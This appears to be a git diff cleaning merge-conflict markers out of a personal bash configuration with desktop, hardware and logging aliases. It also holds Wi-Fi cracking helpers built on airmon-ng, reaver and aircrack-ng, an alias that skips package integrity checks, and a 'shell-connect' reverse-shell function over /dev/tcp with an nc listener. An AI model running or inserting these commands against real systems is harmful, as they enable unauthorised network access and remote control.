@@ -2,7 +2,6 @@
 
 # settings
 stty stop ''; stty start '';
-<<<<<<< HEAD
 setxkbmap -option ctrl:nocaps
 
 #xmodmap -e "keycode 135 = Super_L"
@@ -22,35 +21,25 @@ HISTSIZE= HISTFILESIZE= # infinite history
 
 # alias
 alias ls="ls --color=auto"
-alias ll="ls -la --color=auto"
->>>>>>> 059399a893ce41726188a7ed79f1bf213922d112
 alias df="df -Tha --total"
 alias free="free -mt"
 alias grep="grep --color=auto"
 alias wm-class="xprop | grep WM_CLASS"
-<<<<<<< HEAD
 alias wm-name="xprop | grep 'WM_NAME(STRING)'"
 alias wm-size="xprop | grep REGION"
 alias yayorphan="sudo pacman -Qtdq | sudo pacman -Rns -"
 alias yayskip="yay -S --mflags --skipinteg"
 alias equalizer="pulseaudio-equalizer-gtk"
-=======
-alias wm-size="xprop | grep REGION"
-alias yayskip="yay -S --mflags --skipinteg"
->>>>>>> 059399a893ce41726188a7ed79f1bf213922d112
 alias spotify="/opt/spotify/spotify --force-device-scale-factor=2.5 %U"
 alias cpu-stats="watch -n.5 'cat /proc/cpuinfo | grep \"^[c]pu MHz\" && echo ----- && sensors | grep Core && echo ----- && sensors | grep fan'"
 alias cpu-speed="watch -n.5 'cat /proc/cpuinfo | grep \"^[c]pu MHz\"'"
 alias cpu-temp="watch -n.5 'sensors | grep Core'"
-<<<<<<< HEAD
 alias cpu-fan="watch -n.5 'sensors | grep fan'"
 alias display="ps aux |grep screen-off |grep -v grep"
 alias samsung-web="scrcpy --v4l2-sink /dev/video0 --crop=1040:2200:20:0 --turn-screen-off --window-width=1024"
 alias samsung-web-fullhd="scrcpy --v4l2-sink /dev/video0 --crop=1080:1900:0:240 --turn-screen-off --window-width=1920"
 alias oneplus-web="scrcpy --v4l2-sink /dev/video0 --crop=1080:1900:0:70 --turn-screen-off --window-width=1024"
-=======
-alias cpu-fan="watch -n.5 'sensors | grep fan'" 
->>>>>>> 059399a893ce41726188a7ed79f1bf213922d112
+
 
 # logs
 function log-search() { sudo grep -rsh $1 /var/log | sort; }
@@ -58,10 +47,7 @@ function log-search() { sudo grep -rsh $1 /var/log | sort; }
 # connections
 alias ssh-connections="sudo netstat -tnpa | grep 'ESTABLISHED.*sshd'"
 alias smb-connections="sudo smbstatus -S && sudo smbstatus -L"
-<<<<<<< HEAD
 function sshc(){ ssh 192.168.100."$1" -p 80"$1"; }
-=======
->>>>>>> 059399a893ce41726188a7ed79f1bf213922d112
 
 # airmon
 alias air-start="sudo airmon-ng start wlp5s0"
@@ -72,7 +58,6 @@ function air-wps-restore() { sudo reaver -i wlp5s0mon -vv -S -b "$1" -c "$2" -w 
 function air-record() { sudo airodump-ng -c "$1" -w ~/archive/pen/capture/data-cap wlp5s0mon; }
 function air-decrypt() { sudo aircrack-ng -z "$1" -w "$2"; }
 
-<<<<<<< HEAD
 # gdrive
 function gdrive () {
   CONFIRM=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate "https://docs.google.com/uc?export=download&id=$1" -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')
@@ -80,8 +65,6 @@ function gdrive () {
   rm -rf /tmp/cookies.txt
 }
 
-=======
->>>>>>> 059399a893ce41726188a7ed79f1bf213922d112
 # shell
 function shell-connect() { bash -i >& /dev/tcp/"$1"/"$2" 0>&1; }
 function shell-listen() { sudo nc -nvlp "$1"; }
